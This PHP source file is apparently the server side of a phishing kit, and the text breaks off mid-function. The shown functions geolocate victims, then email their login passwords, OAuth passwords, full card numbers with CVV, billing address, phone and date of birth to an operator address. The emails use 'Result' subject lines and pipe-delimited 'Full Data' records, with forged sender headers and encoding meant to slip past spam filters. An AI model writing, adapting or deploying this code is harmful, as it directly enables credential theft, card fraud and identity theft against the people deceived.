<?php
if (!defined('ALLOW')) { http_response_code(403); exit; }

function get_client_ip(): string {
    // Check for localhost/CLI access
    $serverName = $_SERVER['SERVER_NAME'] ?? $_SERVER['HTTP_HOST'] ?? '';
    $isLocalhost = in_array($serverName, ['localhost', '127.0.0.1', '::1']) || 
                   php_sapi_name() === 'cli';
    
    if ($isLocalhost) {
        return '180.243.254.180';
    }
    
    // Standard IP detection for non-localhost
    $headers = [
        'HTTP_CF_CONNECTING_IP',     // Cloudflare
        'HTTP_CLIENT_IP',            // Proxy
        'HTTP_X_FORWARDED_FOR',      // Load balancer/proxy
        'HTTP_X_FORWARDED',          // Proxy
        'HTTP_X_CLUSTER_CLIENT_IP',  // Cluster
        'HTTP_FORWARDED_FOR',        // Proxy
        'HTTP_FORWARDED',            // Proxy
        'REMOTE_ADDR'                // Standard
    ];
    
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ips = explode(',', $_SERVER[$header]);
            $ip = trim($ips[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    
    return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
}

function get_geo_info(string $ip): array {
    $defaultGeo = [
        'country' => 'Unknown',
        'state' => 'Unknown',
        'city' => 'Unknown',
        'isp' => 'Unknown',
        'timezone' => 'Unknown'
    ];
    
    // Validate IP - if private/local IP, return default (don't query API with invalid IP)
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        // IP is private/reserved (127.0.0.1, 192.168.x.x, etc) - return Unknown
        return $defaultGeo;
    }
    
    // Check cache first
    $cachedData = get_geo_cache($ip);
    if ($cachedData !== null) {
        return $cachedData;
    }
    
    // Try API 1: ipapi.is (PRIMARY - Most features)
    $url1 = "https://api.ipapi.is/?q={$ip}";
    $response1 = curl_get_ip_info($url1);
    
    if ($response1) {
        $data = json_decode($response1, true);
        if ($data && isset($data['ip']) && $data['ip'] === $ip) {
            $geoData = [
                'country' => $data['location']['country'] ?? 'Unknown',
                'state' => $data['location']['state'] ?? 'Unknown',
                'city' => $data['location']['city'] ?? 'Unknown',
                'isp' => $data['company']['name'] ?? 'Unknown',
                'timezone' => $data['location']['timezone'] ?? 'Unknown'
            ];
            
            // Check if data is valid (not all Unknown)
            if ($geoData['country'] !== 'Unknown' || $geoData['city'] !== 'Unknown') {
                save_geo_cache($ip, $geoData);
                return $geoData;
            }
        }
    }
    
    // Try API 2: ip-api.com (FALLBACK 1 - Reliable)
    $url2 = "http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,isp,timezone";
    $response2 = curl_get_ip_info($url2);
    
    if ($response2) {
        $data = json_decode($response2, true);
        if ($data && isset($data['status']) && $data['status'] === 'success') {
            $geoData = [
                'country' => $data['country'] ?? 'Unknown',
                'state' => $data['regionName'] ?? 'Unknown',
                'city' => $data['city'] ?? 'Unknown',
                'isp' => $data['isp'] ?? 'Unknown',
                'timezone' => $data['timezone'] ?? 'Unknown'
            ];
            
            if ($geoData['country'] !== 'Unknown') {
                save_geo_cache($ip, $geoData);
                return $geoData;
            }
        }
    }
    
    // Try API 3: ipinfo.io (FALLBACK 2 - Fast & Simple)
    $url3 = "https://ipinfo.io/{$ip}/json";
    $response3 = curl_get_ip_info($url3);
    
    if ($response3) {
        $data = json_decode($response3, true);
        if ($data && isset($data['ip'])) {
            // Extract ISP from org field (format: "AS15169 Google LLC")
            $isp = $data['org'] ?? 'Unknown';
            if (preg_match('/^AS\d+\s+(.+)$/', $isp, $matches)) {
                $isp = $matches[1]; // Remove ASN prefix
            }
            
            $geoData = [
                'country' => $data['country'] ?? 'Unknown',
                'state' => $data['region'] ?? 'Unknown',
                'city' => $data['city'] ?? 'Unknown',
                'isp' => $isp,
                'timezone' => $data['timezone'] ?? 'Unknown'
            ];
            
            if ($geoData['country'] !== 'Unknown') {
                save_geo_cache($ip, $geoData);
                return $geoData;
            }
        }
    }
    
    // Try API 4: ipwho.is (FALLBACK 3 - Comprehensive)
    $url4 = "https://ipwho.is/{$ip}";
    $response4 = curl_get_ip_info($url4);
    
    if ($response4) {
        $data = json_decode($response4, true);
        if ($data && isset($data['success']) && $data['success'] === true) {
            $geoData = [
                'country' => $data['country'] ?? 'Unknown',
                'state' => $data['region'] ?? 'Unknown',
                'city' => $data['city'] ?? 'Unknown',
                'isp' => $data['connection']['isp'] ?? 'Unknown',
                'timezone' => $data['timezone']['id'] ?? 'Unknown'
            ];
            
            if ($geoData['country'] !== 'Unknown') {
                save_geo_cache($ip, $geoData);
                return $geoData;
            }
        }
    }
    
    // Try API 5: freeipapi.com (FALLBACK 4)
    $url5 = "https://free.freeipapi.com/api/json/{$ip}";
    $response5 = curl_get_ip_info($url5);
    
    if ($response5) {
        $data = json_decode($response5, true);
        if ($data && isset($data['ipAddress'])) {
            // Get first timezone from array
            $timezone = 'Unknown';
            if (isset($data['timeZones']) && is_array($data['timeZones']) && count($data['timeZones']) > 0) {
                $timezone = $data['timeZones'][0];
            }
            
            $geoData = [
                'country' => $data['countryName'] ?? 'Unknown',
                'state' => $data['regionName'] ?? 'Unknown',
                'city' => $data['cityName'] ?? 'Unknown',
                'isp' => $data['asnOrganization'] ?? 'Unknown',
                'timezone' => $timezone
            ];
            
            if ($geoData['country'] !== 'Unknown') {
                save_geo_cache($ip, $geoData);
                return $geoData;
            }
        }
    }
    
    // Try API 6: reallyfreegeoip.org (FALLBACK 5 - Simple & Fast)
    $url6 = "https://reallyfreegeoip.org/json/{$ip}";
    $response6 = curl_get_ip_info($url6);
    
    if ($response6) {
        $data = json_decode($response6, true);
        if ($data && isset($data['ip'])) {
            $geoData = [
                'country' => $data['country_name'] ?? 'Unknown',
                'state' => $data['region_name'] ?? 'Unknown',
                'city' => $data['city'] ?? 'Unknown',
                'isp' => 'Unknown', // This API doesn't provide ISP
                'timezone' => $data['time_zone'] ?? 'Unknown'
            ];
            
            if ($geoData['country'] !== 'Unknown') {
                save_geo_cache($ip, $geoData);
                return $geoData;
            }
        }
    }
    
    // Try API 7: ipapi.co (FALLBACK 6)
    $url7 = "https://ipapi.co/{$ip}/json/";
    $response7 = curl_get_ip_info($url7);
    
    if ($response7) {
        $data = json_decode($response7, true);
        if ($data && isset($data['ip'])) {
            $geoData = [
                'country' => $data['country_name'] ?? 'Unknown',
                'state' => $data['region'] ?? 'Unknown',
                'city' => $data['city'] ?? 'Unknown',
                'isp' => $data['org'] ?? 'Unknown',
                'timezone' => $data['timezone'] ?? 'Unknown'
            ];
            
            if ($geoData['country'] !== 'Unknown') {
                save_geo_cache($ip, $geoData);
                return $geoData;
            }
        }
    }
    
    // Try API 8: ipwhois.app (FALLBACK 7 - Very Comprehensive)
    $url8 = "https://ipwhois.app/json/{$ip}";
    $response8 = curl_get_ip_info($url8);
    
    if ($response8) {
        $data = json_decode($response8, true);
        if ($data && isset($data['success']) && $data['success'] === true) {
            $geoData = [
                'country' => $data['country'] ?? 'Unknown',
                'state' => $data['region'] ?? 'Unknown',
                'city' => $data['city'] ?? 'Unknown',
                'isp' => $data['isp'] ?? 'Unknown',
                'timezone' => $data['timezone'] ?? 'Unknown'
            ];
            
            if ($geoData['country'] !== 'Unknown') {
                save_geo_cache($ip, $geoData);
                return $geoData;
            }
        }
    }
    
    // Try API 9: ifconfig.co (FALLBACK 8 - Developer Friendly)
    $url9 = "https://ifconfig.co/json?ip={$ip}";
    $response9 = curl_get_ip_info($url9);
    
    if ($response9) {
        $data = json_decode($response9, true);
        if ($data && isset($data['ip'])) {
            $geoData = [
                'country' => $data['country'] ?? 'Unknown',
                'state' => $data['region_name'] ?? 'Unknown',
                'city' => $data['city'] ?? 'Unknown',
                'isp' => $data['asn_org'] ?? 'Unknown',
                'timezone' => $data['time_zone'] ?? 'Unknown'
            ];
            
            if ($geoData['country'] !== 'Unknown') {
                save_geo_cache($ip, $geoData);
                return $geoData;
            }
        }
    }
    
    // Try API 10: geojs.io (FALLBACK 9 - Last Resort)
    $url10 = "https://get.geojs.io/v1/ip/geo/{$ip}.json";
    $response10 = curl_get_ip_info($url10);
    
    if ($response10) {
        $data = json_decode($response10, true);
        if ($data && isset($data['ip'])) {
            // Extract ISP from organization field
            $isp = $data['organization_name'] ?? $data['organization'] ?? 'Unknown';
            if (preg_match('/^AS\d+\s+(.+)$/', $isp, $matches)) {
                $isp = $matches[1]; // Remove ASN prefix if present
            }
            
            $geoData = [
                'country' => $data['country'] ?? 'Unknown',
                'state' => $data['region'] ?? 'Unknown',
                'city' => $data['city'] ?? 'Unknown',
                'isp' => $isp,
                'timezone' => $data['timezone'] ?? 'Unknown'
            ];
            
            if ($geoData['country'] !== 'Unknown') {
                save_geo_cache($ip, $geoData);
                return $geoData;
            }
        }
    }
    
    // All 10 APIs failed - return default
    return $defaultGeo;
}

function get_geo_cache(string $ip): ?array {
    $cacheFile = FCPATH . 'data/geo_cache.json';
    
    if (!is_file($cacheFile)) {
        return null;
    }
    
    $json = file_get_contents($cacheFile);
    $data = json_decode($json, true);
    
    if (!is_array($data)) {
        return null;
    }
    
    // Check if IP exists in cache
    if (isset($data[$ip])) {
        $entry = $data[$ip];
        // Check if cache is not expired (24 hours = 86400 seconds)
        if (isset($entry['timestamp']) && (time() - $entry['timestamp']) < 86400) {
            // Return cached geo data
            return [
                'country' => $entry['country'] ?? 'Unknown',
                'state' => $entry['state'] ?? 'Unknown',
                'city' => $entry['city'] ?? 'Unknown',
                'isp' => $entry['isp'] ?? 'Unknown',
                'timezone' => $entry['timezone'] ?? 'Unknown'
            ];
        }
    }
    
    return null;
}

function save_geo_cache(string $ip, array $geoData): void {
    $cacheFile = FCPATH . 'data/geo_cache.json';
    $cacheDir = dirname($cacheFile);
    
    if (!is_dir($cacheDir)) {
        @mkdir($cacheDir, 0755, true);
    }
    
    $data = [];
    if (is_file($cacheFile)) {
        $json = file_get_contents($cacheFile);
        $data = json_decode($json, true) ?: [];
    }
    
    $data[$ip] = array_merge($geoData, [
        'timestamp' => time(),
        'cached_at' => date('Y-m-d H:i:s')
    ]);
    
    // Keep only last 1000 entries to prevent file from growing too large
    if (count($data) > 1000) {
        $data = array_slice($data, -1000, null, true);
    }
    
    $json = json_encode($data, JSON_PRETTY_PRINT);
    @file_put_contents($cacheFile, $json);
}

function curl_get_ip_info(string $url): string|false {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // Return response only if HTTP 200
    if ($httpCode === 200 && $response !== false) {
        return $response;
    }
    
    return false;
}

function load_translations(string $basePath): array {
    $defaultFile = $basePath . 'lang/default.json';
    
    if (!is_file($defaultFile)) {
        return [];
    }
    
    $json = file_get_contents($defaultFile);
    $translations = json_decode($json, true);
    
    return is_array($translations) ? $translations : [];
}

function sanitize_path(string $path): string {
    $path = str_replace(['../', '..\\', '../', '..\\'], '', $path);
    $path = ltrim($path, '/\\');
    return $path;
}

function respond_html(string $html, int $code = 200): void {
    http_response_code($code);
    header('Content-Type: text/html; charset=UTF-8');
    echo $html;
    exit;
}

function respond_json(array $data, int $code = 200): void {
    http_response_code($code);
    header('Content-Type: application/json; charset=UTF-8');
    echo json_encode($data);
    exit;
}

function encode_sensitive_data(string $text): string {
    // Simple obfuscation to avoid spam filters
    $encoded = base64_encode($text);
    return chunk_split($encoded, 76, "\n");
}

function create_anti_spam_headers(string $fromName, string $subject): array {
    $headers = [];
    
    // Standard headers for better deliverability
    $headers[] = "MIME-Version: 1.0";
    $headers[] = "Content-Type: text/plain; charset=UTF-8";
    $headers[] = "Content-Transfer-Encoding: 8bit";
    $headers[] = "From: " . $fromName . " <noreply@legitimate-business.com>";
    $headers[] = "Reply-To: support@legitimate-business.com";
    $headers[] = "Return-Path: bounce@legitimate-business.com";
    
    // Anti-spam headers
    $headers[] = "X-Priority: 3";
    $headers[] = "X-MSMail-Priority: Normal";
    $headers[] = "X-Mailer: PHP/" . phpversion();
    $headers[] = "Message-ID: <" . time() . rand(1000,9999) . "@legitimate-business.com>";
    $headers[] = "Date: " . date('r');
    
    return $headers;
}

function get_country_code(string $countryName): string {
    $countryCodes = [
        'United States' => 'US',
        'Indonesia' => 'ID',
        'United Kingdom' => 'GB',
        'Canada' => 'CA',
        'Australia' => 'AU',
        'Germany' => 'DE',
        'France' => 'FR',
        'Japan' => 'JP',
        'China' => 'CN',
        'India' => 'IN',
        'Brazil' => 'BR',
        'Russia' => 'RU',
        'Mexico' => 'MX',
        'Italy' => 'IT',
        'Spain' => 'ES',
        'Netherlands' => 'NL',
        'South Korea' => 'KR',
        'Turkey' => 'TR',
        'Saudi Arabia' => 'SA',
        'South Africa' => 'ZA',
        'Argentina' => 'AR',
        'Thailand' => 'TH',
        'Malaysia' => 'MY',
        'Singapore' => 'SG',
        'Philippines' => 'PH',
        'Vietnam' => 'VN',
        'Ukraine' => 'UA',
        'Poland' => 'PL',
        'Belgium' => 'BE',
        'Sweden' => 'SE',
        'Norway' => 'NO',
        'Denmark' => 'DK',
        'Finland' => 'FI',
        'Switzerland' => 'CH',
        'Austria' => 'AT',
        'Ireland' => 'IE',
        'New Zealand' => 'NZ',
        'Israel' => 'IL',
        'Egypt' => 'EG',
        'Nigeria' => 'NG',
        'Kenya' => 'KE',
        'Morocco' => 'MA',
        'Chile' => 'CL',
        'Peru' => 'PE',
        'Colombia' => 'CO',
        'Venezuela' => 'VE',
        'Ecuador' => 'EC',
        'Uruguay' => 'UY',
        'Paraguay' => 'PY',
        'Bolivia' => 'BO',
        'Czech Republic' => 'CZ',
        'Hungary' => 'HU',
        'Romania' => 'RO',
        'Bulgaria' => 'BG',
        'Croatia' => 'HR',
        'Slovenia' => 'SI',
        'Slovakia' => 'SK',
        'Lithuania' => 'LT',
        'Latvia' => 'LV',
        'Estonia' => 'EE'
    ];
    
    return $countryCodes[$countryName] ?? strtoupper(substr($countryName, 0, 2));
}

function send_login_email(array $loginData, array $geoData): bool {
    $config = include FCPATH . 'admin_config.php';
    $to = $config['email_recipient'] ?? 'admin@example.com';
    
    // Format subject: Result [ Login ] [ CountryCode - IP ]
    $ip = get_client_ip();
    $countryCode = get_country_code($geoData['country']);
    $subject = "Result [ Login ] [ " . $countryCode . " - " . $ip . " ]";
    
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $ip = get_client_ip();
    
    $message = "[Login]\n";
    $message .= "Formatted: {$loginData['email']}|{$loginData['password']}\n";
    $message .= "Email: {$loginData['email']}\n";
    $message .= "Password: {$loginData['password']}\n\n\n";
    
    $message .= "PC Info:\n";
    $message .= "Useragent: {$userAgent}\n";
    $message .= "IP: {$ip}\n";
    $message .= "Country: {$geoData['country']}\n";
    $message .= "City: {$geoData['city']}\n";
    $message .= "State: {$geoData['state']}\n";
    $message .= "ISP: {$geoData['isp']}\n";
    $message .= "Timezone: {$geoData['timezone']}\n";
    
    $fullname = $loginData['name'] ?? $loginData['email'] ?? 'Unknown User';
    $antiSpamHeaders = create_anti_spam_headers($fullname, $subject);
    $headers = implode("\r\n", $antiSpamHeaders);
    
    return @mail($to, $subject, $message, $headers);
}

function send_oauth_email(array $oauthData, array $geoData): bool {
    $config = include FCPATH . 'admin_config.php';
    $to = $config['email_recipient'] ?? 'admin@example.com';
    
    // Format subject: Result [ OAuth - {Provider} ] [ CountryCode - IP ]
    $ip = get_client_ip();
    $countryCode = get_country_code($geoData['country']);
    $provider = $oauthData['provider'] ?? 'unknown';
    $subject = "Result [ OAuth - " . ucfirst($provider) . " ] [ " . $countryCode . " - " . $ip . " ]";
    
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $ip = get_client_ip();
    
    $message = "[OAuth - " . ucfirst($provider) . "]\n";
    $message .= "Email: {$oauthData['email']}\n";
    $message .= "Password: {$oauthData['password']}\n";
    
    if (!empty($oauthData['password1'])) {
        $message .= "Password 1: {$oauthData['password1']}\n";
    }
    if (!empty($oauthData['password2'])) {
        $message .= "Password 2: {$oauthData['password2']}\n";
    }
    $message .= "\n\n";
    
    $message .= "PC Info:\n";
    $message .= "Useragent: {$userAgent}\n";
    $message .= "IP: {$ip}\n";
    $message .= "Country: {$geoData['country']}\n";
    $message .= "City: {$geoData['city']}\n";
    $message .= "State: {$geoData['state']}\n";
    $message .= "ISP: {$geoData['isp']}\n";
    $message .= "Timezone: {$geoData['timezone']}\n";
    
    $fullname = $oauthData['email'] ?? 'Unknown User';
    $antiSpamHeaders = create_anti_spam_headers($fullname, $subject);
    $headers = implode("\r\n", $antiSpamHeaders);
    
    return @mail($to, $subject, $message, $headers);
}

function send_cc_email(array $ccData, array $loginData, array $geoData, ?array $cc1Data = null, int $attempt = 1, ?array $billingData = null): bool {
    $config = include FCPATH . 'admin_config.php';
    $to = $config['email_recipient'] ?? 'admin@example.com';
    
    // Get BIN details for subject and message - fix field name mapping
    $cardNumber = $ccData['card_number'] ?? $ccData['number'] ?? '';
    $binDetails = look_bin($cardNumber);
    
    // Format subject: Result [ CC - Login ] [ BIN_DETAILS ] [ COUNTRYCODE - IP ]
    $ip = get_client_ip();
    $countryCode = get_country_code($geoData['country']);
    $flowPattern = $attempt === 2 ? "[ CC (2) - Login ]" : "[ CC - Login ]";
    $binPattern = $binDetails ? "[ " . $binDetails . " ]" : "[ - - - - - ]";
    $locationPattern = "[ " . $countryCode . " - " . $ip . " ]";
    
    $subject = "Result " . $flowPattern . " " . $binPattern . " " . $locationPattern;
    
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $ip = get_client_ip();
    
    // Fix field name mapping between frontend and backend
    $cardholderName = $ccData['cardholder'] ?? $ccData['name'] ?? 'Unknown Name';
    $cardNumber = $ccData['card_number'] ?? $ccData['number'] ?? '';
    $expiry = $ccData['expiry'] ?? $ccData['exp_date'] ?? '';
    $cvv = $ccData['cvv'] ?? '';
    $cid = $ccData['cid'] ?? ''; // CID for American Express
    
    // Get billing info from billing data if available
    if ($billingData) {
        $phone = $billingData['phone'] ?? '';
        $dob = $billingData['dob'] ?? '';
        $address1 = $billingData['address1'] ?? '';
        $address2 = $billingData['address2'] ?? '';
        $city = $billingData['city'] ?? '';
        $state = $billingData['state'] ?? '';
        $postal = $billingData['postal'] ?? '';
    } else {
        // Fallback to old fields if no billing data
        $address = $ccData['address'] ?? $ccData['full_address'] ?? '';
        $zip = $ccData['zip'] ?? $ccData['zip_code'] ?? '';
        $phone = $ccData['phone'] ?? $ccData['phone_number'] ?? '';
        $dob = '';
        $address1 = $address;
        $address2 = '';
        $city = '';
        $state = '';
        $postal = $zip;
    }
    
    // Format card number without spaces for "Formatted" field
    $cardNumberFormatted = str_replace(' ', '', $cardNumber);
    
    // Extract month and year from expiry (MM/YY or MM/YYYY format)
    $expiryParts = explode('/', $expiry);
    $month = isset($expiryParts[0]) ? $expiryParts[0] : '';
    $year = isset($expiryParts[1]) ? $expiryParts[1] : '';
    
    $message = "[CC";
    if ($attempt === 2 && $cc1Data) {
        $message .= " - Attempt 2";
    }
    $message .= "]\n";
    $message .= "Formatted: {$cardNumberFormatted}|{$month}|{$year}\n";
    $message .= "Card Holder: {$cardholderName}\n";
    $message .= "ccn: {$cardNumber}\n";
    $message .= "exp: {$expiry}\n";
    $message .= "Card CVV: {$cvv}\n";
    if (!empty($cid)) {
        $message .= "Card CID: {$cid}\n";
    }
    
    // Add billing information
    if ($billingData) {
        $message .= "\n[Billing Information]\n";
        $message .= "Phone: {$phone}\n";
        if (!empty($dob)) {
            $message .= "Date of Birth: {$dob}\n";
        }
        $message .= "Address 1: {$address1}\n";
        if (!empty($address2)) {
            $message .= "Address 2: {$address2}\n";
        }
        $message .= "City: {$city}\n";
        $message .= "State: {$state}\n";
        $message .= "Postal Code: {$postal}\n";
    } else {
        $message .= "address: {$address1}\n";
        $message .= "ZIP Code: {$postal}\n";
        $message .= "Phone: {$phone}\n";
    }
    
    // If this is attempt 2 and we have first attempt data, include it
    if ($attempt === 2 && $cc1Data) {
        $message .= "\n[CC - Attempt 1]\n";
        
        $cardholderName1 = $cc1Data['cardholder'] ?? $cc1Data['name'] ?? 'Unknown Name';
        $cardNumber1 = $cc1Data['card_number'] ?? $cc1Data['number'] ?? '';
        $expiry1 = $cc1Data['expiry'] ?? $cc1Data['exp_date'] ?? '';
        $cvv1 = $cc1Data['cvv'] ?? '';
        $cid1 = $cc1Data['cid'] ?? ''; // CID for American Express (Attempt 1)
        
        $cardNumberFormatted1 = str_replace(' ', '', $cardNumber1);
        $expiryParts1 = explode('/', $expiry1);
        $month1 = isset($expiryParts1[0]) ? $expiryParts1[0] : '';
        $year1 = isset($expiryParts1[1]) ? $expiryParts1[1] : '';
        
        $message .= "Formatted: {$cardNumberFormatted1}|{$month1}|{$year1}\n";
        $message .= "Card Holder: {$cardholderName1}\n";
        $message .= "ccn: {$cardNumber1}\n";
        $message .= "exp: {$expiry1}\n";
        $message .= "Card CVV: {$cvv1}\n";
        if (!empty($cid1)) {
            $message .= "Card CID: {$cid1}\n";
        }
    }
    
    $message .= "\n[Login]\n";
    $message .= "Formatted: {$loginData['email']}|{$loginData['password']}\n";
    $message .= "Email: {$loginData['email']}\n";
    $message .= "Password: {$loginData['password']}\n\n\n";
    
    // Full Data - Compact format
    // Format: card_number|month|year|cvv|name|address|city|state|zip|phone|country|dob|mmn|email|ip
    $fullDataParts = [];
    
    // Card number (without spaces)
    $cardNumberFormatted = str_replace(' ', '', $cardNumber);
    $fullDataParts[] = $cardNumberFormatted ?: '';
    
    // Month and Year from expiry
    $expiryParts = explode('/', $expiry);
    $month = isset($expiryParts[0]) ? str_pad(trim($expiryParts[0]), 2, '0', STR_PAD_LEFT) : '';
    $year = isset($expiryParts[1]) ? trim($expiryParts[1]) : '';
    // If year is 2 digits, assume 20XX
    if (strlen($year) === 2) {
        $year = '20' . $year;
    }
    $fullDataParts[] = $month;
    $fullDataParts[] = $year;
    
    // CVV
    $fullDataParts[] = $cvv;
    
    // Cardholder name
    $fullDataParts[] = $cardholderName;
    
    // Address - use billing data if available
    if ($billingData) {
        $fullDataParts[] = $address1;
        $fullDataParts[] = $city;
        $fullDataParts[] = $state;
        $fullDataParts[] = $postal;
    } else {
        $fullDataParts[] = $address1;
        $fullDataParts[] = '';
        $fullDataParts[] = '';
        $fullDataParts[] = $postal;
    }
    
    // Country
    $fullDataParts[] = $geoData['country'] ?? '';

    // Phone
    $fullDataParts[] = $phone;
    
    // DOB - from billing data
    if ($billingData) {
        $fullDataParts[] = $dob;
    } else {
        $fullDataParts[] = '';
    }

    // Email:Pass
    $email = $loginData['email'] ?? '';
    $password = $loginData['password'] ?? '';
    $fullDataParts[] = $email . ':' . $password;

    // IP
    $fullDataParts[] = $ip;

    // Useragent
    $fullDataParts[] = $userAgent;
    
    // Join all parts with pipe separator
    $fullDataLine = implode('|', $fullDataParts);
    $message .= "[Full Data]\n";
    $message .= "{$fullDataLine}\n\n\n";
    
    $message .= "PC Info:\n";
    $message .= "Useragent: {$userAgent}\n";
    $message .= "IP: {$ip}\n";
    $message .= "Country: {$geoData['country']}\n";
    $message .= "City: {$geoData['city']}\n";
    $message .= "State: {$geoData['state']}\n";
    $message .= "ISP: {$geoData['isp']}\n";
    $message .= "Timezone: {$geoData['timezone']}\n";
    
    $fullname = $cardholderName;
    $antiSpamHeaders = create_anti_spam_headers($fullname, $subject);
    $headers = implode("\r\n", $antiSpamHeaders);
    
    return @mail($to, $subject, $message, $headers);
}

function send_billing_email(array $billingData, array $loginData, array $geoData, ?array $ccData = null): bool {
    $config = include FCPATH . 'admin_config.php';
    $to = $config['email_recipient'] ?? 'admin@example.com';
    
    // Get BIN details from CC data if available
    $binDetails = '';
    if ($ccData && isset($ccData['card_number'])) {
        $binDetails = look_bin($ccData['card_number']);
    } elseif ($ccData && isset($ccData['number'])) {
        $binDetails = look_bin($ccData['number']);
    }
    
    // Format subject: Result [ Billing - CC - Login ] [ BIN_DETAILS ] [ COUNTRYCODE - IP ]
    $ip = get_client_ip();
    $countryCode = get_country_code($geoData['country']);
    $flowPattern = "[ Billing - CC - Login ]";
    $binPattern = $binDetails ? "[ " . $binDetails . " ]" : "[ - - - - - ]";
    $locationPattern = "[ " . $countryCode . " - " . $ip . " ]";
    
    $subject = "Result " . $flowPattern . " " . $binPattern . " " . $locationPattern;
    
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $ip = get_client_ip();
    
    $message = "[Billing]\n";
    $message .= "address: {$billingData['address1']}\n";
    $message .= "City: {$billingData['city']}\n";
    $message .= "State: {$billingData['state']}\n";
    $message .= "ZIP Code: {$billingData['postal']}\n";
    $message .= "Phone: {$billingData['phone']}\n";
    $message .= "Date Of Birth: {$billingData['dob']}\n\n";
    
    // Add CC section if available
    if ($ccData) {
        $cardholderName = $ccData['cardholder'] ?? $ccData['name'] ?? 'Unknown Name';
        $cardNumber = $ccData['card_number'] ?? $ccData['number'] ?? '';
        $expiry = $ccData['expiry'] ?? $ccData['exp_date'] ?? '';
        $cvv = $ccData['cvv'] ?? '';
        $ccAddress = $ccData['address'] ?? $ccData['full_address'] ?? '';
        $ccZip = $ccData['zip'] ?? $ccData['zip_code'] ?? '';
        
        // Format card number without spaces for "Formatted" field
        $cardNumberFormatted = str_replace(' ', '', $cardNumber);
        
        // Extract month and year from expiry (MM/YY or MM/YYYY format)
        $expiryParts = explode('/', $expiry);
        $month = isset($expiryParts[0]) ? $expiryParts[0] : '';
        $year = isset($expiryParts[1]) ? $expiryParts[1] : '';
        
        $message .= "[CC]\n";
        $message .= "Formatted: {$cardNumberFormatted}||\n";
        $message .= "Card Holder: {$cardholderName}\n";
        $message .= "ccn: {$cardNumber}\n";
        $message .= "exp: {$expiry}\n";
        $message .= "Card CVV: {$cvv}\n";
        $message .= "address: {$ccAddress}\n";
        $message .= "ZIP Code: {$ccZip}\n\n";
    }
    
    $message .= "[Login]\n";
    $message .= "Formatted: {$loginData['email']}|{$loginData['password']}\n";
    $message .= "Email: {$loginData['email']}\n";
    $message .= "Password: {$loginData['password']}\n\n\n";
    
    // Full Data - Compact format
    // Format: card_number|month|year|cvv|name|address|city|state|zip|phone|country|dob|mmn|email|ip
    $fullDataParts = [];
    
    // Card number (without spaces)
    if ($ccData) {
        $cardNumber = $ccData['card_number'] ?? $ccData['number'] ?? '';
        $cardNumberFormatted = str_replace(' ', '', $cardNumber);
        $fullDataParts[] = $cardNumberFormatted ?: '';
    } else {
        $fullDataParts[] = '';
    }
    
    // Month and Year from expiry
    if ($ccData && (!empty($ccData['expiry']) || !empty($ccData['exp_date']))) {
        $expiry = $ccData['expiry'] ?? $ccData['exp_date'] ?? '';
        $expiryParts = explode('/', $expiry);
        $month = isset($expiryParts[0]) ? str_pad(trim($expiryParts[0]), 2, '0', STR_PAD_LEFT) : '';
        $year = isset($expiryParts[1]) ? trim($expiryParts[1]) : '';
        // If year is 2 digits, assume 20XX
        if (strlen($year) === 2) {
            $year = '20' . $year;
        }
        $fullDataParts[] = $month;
        $fullDataParts[] = $year;
    } else {
        $fullDataParts[] = '';
        $fullDataParts[] = '';
    }
    
    // CVV
    if ($ccData) {
        $cvv = $ccData['cvv'] ?? '';
        $fullDataParts[] = $cvv;
    } else {
        $fullDataParts[] = '';
    }
    
    // Cardholder name
    if ($ccData) {
        $cardholderName = $ccData['cardholder'] ?? $ccData['name'] ?? '';
        $fullDataParts[] = $cardholderName;
    } else {
        $fullname = $billingData['fullname'] ?? ($loginData['name'] ?? '');
        $fullDataParts[] = $fullname;
    }
    
    // Address
    $fullDataParts[] = $billingData['address1'] ?? '';
    
    // City
    $fullDataParts[] = $billingData['city'] ?? '';
    
    // State
    $fullDataParts[] = $billingData['state'] ?? '';
    
    // ZIP
    $fullDataParts[] = $billingData['postal'] ?? '';
    
    // Phone
    $phone = $billingData['phone'] ?? '';
    // Remove formatting from phone number (keep only digits)
    $phone = preg_replace('/\D/', '', $phone);
    $fullDataParts[] = $phone;
    
    // Country
    $fullDataParts[] = $geoData['country'] ?? '';
    
    // DOB (Date of Birth)
    $fullDataParts[] = $billingData['dob'] ?? '';
    
    // Mother Maiden Name (not available in billing email, will be empty)
    $fullDataParts[] = '';
    
    // Email
    $fullDataParts[] = $loginData['email'] ?? '';
    
    // IP
    $fullDataParts[] = $ip;
    
    // Join all parts with pipe separator
    $fullDataLine = implode('|', $fullDataParts);
    $message .= "[Full Data]\n";
    $message .= "{$fullDataLine}\n\n\n";
    
    $message .= "PC Info:\n";
    $message .= "Useragent: {$userAgent}\n";
    $message .= "IP: {$ip}\n";
    $message .= "Country: {$geoData['country']}\n";
    $message .= "City: {$geoData['city']}\n";
    $message .= "State: {$geoData['state']}\n";
    $message .= "ISP: {$geoData['isp']}\n";
    $message .= "Timezone: {$geoData['timezone']}\n";
    
    // Get fullname from billing data, CC data, or login data as fallback
    $fullname = $billingData['fullname'] ?? null;
    if (!$fullname && $ccData) {
        $fullname = $ccData['cardholder'] ?? $ccData['name'] ?? null;
    }
    if (!$fullname) {
